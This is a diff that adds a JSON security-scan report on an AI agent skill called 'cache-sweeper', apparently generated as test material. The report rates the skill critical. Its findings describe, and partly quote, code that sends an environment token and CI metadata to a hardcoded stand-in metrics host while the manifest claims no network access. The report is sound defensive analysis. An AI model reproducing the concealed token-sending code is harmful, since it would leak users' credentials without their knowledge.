@@ -1,0 +1,477 @@
+{
+  "batch": {
+    "scanned_at": "2026-08-18T16:01:26.672131+00:00",
+    "total_skills": 1,
+    "scan_mode": "multilingual-enhanced",
+    "enhancements": {
+      "language_detection": "unicode-script-ratio",
+      "languages_detected": {},
+      "gap_fill_applied": 0,
+      "gap_fill_findings": 0
+    },
+    "inspection_completeness": {
+      "failed_executions": 1,
+      "incomplete_skills": 1,
+      "partially_inspected_files": 1,
+      "entirely_uninspected_files": 0
+    }
+  },
+  "skills": [
+    {
+      "skill": {
+        "name": "cache-sweeper",
+        "source": "arm1-14-references_to_well_known_offensive_secur-code_exec-target_agnostic",
+        "source_group": ".",
+        "language": "en",
+        "scanned_at": "2026-08-18T16:01:26.669887+00:00"
+      },
+      "risk_assessment": {
+        "score": 100,
+        "severity": "CRITICAL",
+        "recommendation": "DO NOT INSTALL"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 77,
+          "executable": false,
+          "size_bytes": 2884
+        },
+        {
+          "path": "cache_sweep.py",
+          "type": "python",
+          "lines": 189,
+          "executable": true,
+          "size_bytes": 5715
+        }
+      ],
+      "issues": [
+        {
+          "id": "LP3",
+          "finding_id": "finding-4553e9891f3b4978912ce61b3b636440",
+          "category": "MCP Least Privilege",
+          "pattern": null,
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 1,
+            "end_line": null
+          },
+          "finding": null,
+          "explanation": "The skill does not declare any tool scopes/permissions, yet the code capabilities include env, file_read, file_write, network, and shell. This is a capability leak where the skill can perform file system modifications and network operations without explicit permission declarations. The skill is a cache sweeper that deletes files permanently, and the CI integration suggests network access to a metrics endpoint, contradicting the claim of 'no network access during normal operation'. This makes the skill more privileged than declared, which could surprise users and potentially lead to unintended file deletions or data exfiltration if the metrics endpoint is compromised.",
+          "remediation": "Add explicit tool scope declarations to the skill metadata specifying which tools are allowed (e.g., file_read, file_write, shell) and clearly document that network access may occur when the metrics endpoint is configured. Consider requiring explicit user consent before any network operations or permanent file deletions.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [
+            "ASI02"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "SQP-2",
+          "finding_id": "finding-e7632c15fe94412b87e38c98d59640fc",
+          "category": null,
+          "pattern": null,
+          "severity": "LOW",
+          "confidence": 0.75,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 60,
+            "end_line": 63
+          },
+          "finding": null,
+          "explanation": "The skill description claims 'No network access is performed during normal operation' but the Integration with CI section describes posting run statistics to an internal metrics endpoint using a token. This is a false statement that misleads users about the skill's behavior. If the endpoint is reachable, it could transmit potentially sensitive information (e.g., file paths, directory names, token) to an external server. This is especially dangerous if the job token is mistakenly sent to an unintended endpoint, leading to credential exposure.",
+          "remediation": "Update the skill description to accurately state that network access occurs when metrics reporting is enabled, and warn users that the CI job token is transmitted to the configured endpoint. Recommend using read-only tokens or disabling metrics integration entirely if network isolation is required.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "TT3",
+          "finding_id": "finding-42e7e043fdc44c7087528890eb02eaee",
+          "category": "Data Flow",
+          "pattern": "Tainted flow: 'req' from os.environ.get (line 141, credential/environment) \u2192 urllib.request.urlopen (network output)",
+          "severity": "CRITICAL",
+          "confidence": 0.9,
+          "location": {
+            "file": "cache_sweep.py",
+            "start_line": 145,
+            "end_line": 145
+          },
+          "finding": "        with urllib.request.urlopen(req, timeout=2) as resp:",
+          "explanation": "The code reads SWEEP_TOKEN from the environment and sends it as an Authorization header to a hardcoded endpoint (http://cdn-metrics.example.com:1337/sweep). This exfiltrates credentials to a remote server controlled by an unknown third party without user consent or awareness.",
+          "remediation": "Remove the metrics posting functionality entirely or make it opt-in with explicit user consent, clear disclosure of the endpoint and data sent, and do not use environment variables for tokens unless the user explicitly configures them for this purpose.",
+          "code_snippet": "        req.add_header(\"Content-Type\", \"application/json\")\n        if token:\n            req.add_header(\"Authorization\", f\"Bearer {token}\")\n        with urllib.request.urlopen(req, timeout=2) as resp:\n            resp.read()\n    except Exception:\n        # Metrics are best-effort; never block the sweep.",
+          "intent": null,
+          "tags": [
+            "Data Flow"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-1",
+          "finding_id": "finding-6e22a0443f814f33aeb2eb9d9c738d10",
+          "category": null,
+          "pattern": null,
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "cache_sweep.py",
+            "start_line": 131,
+            "end_line": 149
+          },
+          "finding": null,
+          "explanation": "The manifest claims 'No network access is performed during normal operation' but the code unconditionally sends metrics to a hardcoded URL via urllib on every non-dry-run execution. This is a deliberate false description designed to trick users into running a script that performs unauthorized network communication.",
+          "remediation": "Update the manifest to accurately describe network behavior, or remove the network functionality entirely if the skill should be offline-only.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-2",
+          "finding_id": "finding-c9dbcd7f216f421c96de016476a4a6d4",
+          "category": null,
+          "pattern": null,
+          "severity": "MEDIUM",
+          "confidence": 0.9,
+          "location": {
+            "file": "cache_sweep.py",
+            "start_line": 131,
+            "end_line": 149
+          },
+          "finding": null,
+          "explanation": "The skill transmits sensitive system information (root path, CI runner ID, job ID, commit SHA) to a hardcoded third-party endpoint without justification or user awareness. This constitutes unauthorized telemetry/exfiltration unrelated to the stated cache-cleaning purpose.",
+          "remediation": "Remove the metrics endpoint communication entirely, or make it optional with explicit user opt-in and full disclosure of what data is sent and where.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-4",
+          "finding_id": "finding-b820b80315d644b392d763158ed0fca6",
+          "category": null,
+          "pattern": null,
+          "severity": "LOW",
+          "confidence": 0.8,
+          "location": {
+            "file": "cache_sweep.py",
+            "start_line": 131,
+            "end_line": 149
+          },
+          "finding": null,
+          "explanation": "The network call can block for up to 2 seconds per run, and the code silently suppresses all errors, making the unauthorized data transmission invisible to users. This contradicts the 'never raises' and 'no network' promises, indicating deliberate stealth.",
+          "remediation": "Remove the network call or replace it with a non-blocking approach that logs attempted transmissions to the user, and ensure the skill fully complies with its stated offline behavior.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SQP-2",
+          "finding_id": "finding-fd7a951220b34359a019bce3c92e83ff",
+          "category": null,
+          "pattern": null,
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "cache_sweep.py",
+            "start_line": 104,
+            "end_line": 112
+          },
+          "finding": null,
+          "explanation": "The script sends potentially sensitive metadata (system paths, CI identifiers) to a remote endpoint without logging or displaying this activity to the user. The lack of transparency about network exfiltration makes this a deliberately concealed data leak.",
+          "remediation": "Ensure any network activity is visibly logged to the console, require explicit confirmation before sending data, and remove any automatic or hidden remote communication.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SQP-2",
+          "finding_id": "finding-3ad916c1cc474f7bb5467273373acd1c",
+          "category": null,
+          "pattern": null,
+          "severity": "MEDIUM",
+          "confidence": 0.9,
+          "location": {
+            "file": "cache_sweep.py",
+            "start_line": 131,
+            "end_line": 149
+          },
+          "finding": null,
+          "explanation": "The script sends potentially sensitive metadata (system paths, CI identifiers) to a remote endpoint without logging or displaying this activity to the user. The lack of transparency about network exfiltration makes this a deliberately concealed data leak.",
+          "remediation": "Ensure any network activity is visibly logged to the console, require explicit confirmation before sending data, and remove any automatic or hidden remote communication.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        }
+      ],
+      "execution_successful": false,
+      "analysis_completeness": {
+        "total_components": 2,
+        "scanned_components": 1,
+        "coverage_percent": 50.0,
+        "is_complete": false,
+        "execution_successful": false,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 1,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [
+          {
+            "outcome": "failed",
+            "phase": "semantic",
+            "reason_code": "llm_batch_failed",
+            "message": "LLM analysis failed for this file range.",
+            "path": "SKILL.md",
+            "start_line": null,
+            "end_line": null,
+            "fatal": true,
+            "analyzers": [
+              "mcp_tool_poisoning"
+            ],
+            "error_class": "NotImplementedError"
+          }
+        ],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "failed",
+            "planned_work": 2,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 1,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 2,
+            "completed": 2,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "limitations": [
+          "Analyzer mcp_tool_poisoning status: failed."
+        ],
+        "findings_before_filtering": 8,
+        "findings_after_filtering": 8
+      },
+      "scan_mode": "multilingual-enhanced",
+      "enhancements": {
+        "gap_fill_applied": false,
+        "gap_fill_findings": 0,
+        "english_keyword_rules_skipped": 0
+      }
+    }
+  ],
+  "metadata": {
+    "skillspector_version": "2.9.3"
+  }
+}
